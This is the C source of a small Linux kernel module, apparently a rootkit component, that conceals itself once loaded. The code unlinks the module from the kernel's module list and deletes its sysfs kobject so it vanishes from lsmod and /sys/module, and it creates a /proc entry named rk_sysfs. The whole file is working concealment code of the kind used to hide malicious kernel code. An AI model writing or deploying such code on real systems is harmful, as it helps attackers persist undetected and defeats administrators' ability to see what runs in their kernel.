// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>

static struct proc_dir_entry *entry;

static void hide_module(void)
{
	list_del_init(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	pr_info("rk: module hidden from lsmod and sysfs\n");
}

static ssize_t cloak_read(struct file *file, char __user *buffer,
			   size_t count, loff_t *position)
{
	static const char msg[] = "hidden\n";

	return simple_read_from_buffer(buffer, count, position,
				       msg, sizeof(msg) - 1);
}

static const struct proc_ops cloak_ops = {
	.proc_read = cloak_read,
};

static int __init cloak_init(void)
{
	entry = proc_create("rk_sysfs", 0444, NULL, &cloak_ops);
	if (!entry)
		return -ENOMEM;

	hide_module();
	return 0;
}

static void __exit cloak_exit(void)
{
	proc_remove(entry);
}

module_init(cloak_init);
module_exit(cloak_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Sysfs kobject concealment");
